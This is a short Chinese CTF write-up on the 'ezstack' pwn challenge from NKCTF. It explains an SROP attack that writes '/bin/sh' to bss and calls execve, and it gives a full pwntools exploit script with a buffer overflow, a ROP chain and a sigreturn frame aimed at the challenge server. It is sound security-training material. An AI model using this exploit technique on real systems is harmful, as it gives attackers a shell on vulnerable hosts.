---
title: nkctf_ezstack
date: 2023-03-26 22:05:12
categories: 
- pwn_wp
tags: 
- pwn
- ROP
- SROP
---

nkctf的ezstack，走SROP。

<!-- more -->

没开RELRP、Canary和PIE

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/ezstack/ez_stack'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

找`gadget`找到了这些，`0xf`对应的系统调用是`sigreturn`，看来应该是走SROP了

```asm
0x0000000000401147 : mov eax, 0xf ; ret
0x0000000000401146 : mov rax, 0xf ; ret
```

要通过SROP执行`execve("/bin/sh\x00",0,0)`，需要找到`"/bin/sh\x00"`的地址，但程序中没有，需要我们自行写入。

但程序唯一一次写入的是栈上，有`ASLR`没办法定位，这里利用寄存器留下的值并通过**ROP**设置部分参数再次执行`sys_read`，将`"/bin/sh\x00"`写入`bss`段。（当然**也可以利用SROP直接执行`SYS_READ`写入**）

之后通过SROP执行`execve("/bin/sh\x00",0,0)`即可`get shell`。

找到的wp大多是py2的，之前也没试过用py3写SROP，这里的应该用`bytes(frame)`转化`frame`的类型

**exp：** 

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='ez_stack'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
p=remote('node.yuzhian.com.cn',34603)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
mov_rax_0xf=0x0000000000401146
syscall=0x000000000040114e
mov_rax_0_pop_rbp=0x00000000004011f0
pop_rdi=0x0000000000401283
pop_rsi_r15=0x0000000000401281
bss_addr=elf.bss()
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bss_addr
frame.rip=syscall
r()
payload=b'a'*0x18+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(mov_rax_0_pop_rbp)+p64(bss_addr)+p64(syscall)
payload+=p64(mov_rax_0xf)+p64(syscall)
payload+=bytes(frame)
# debug()
s(payload)
s("/bin/sh\x00")

itr()

```

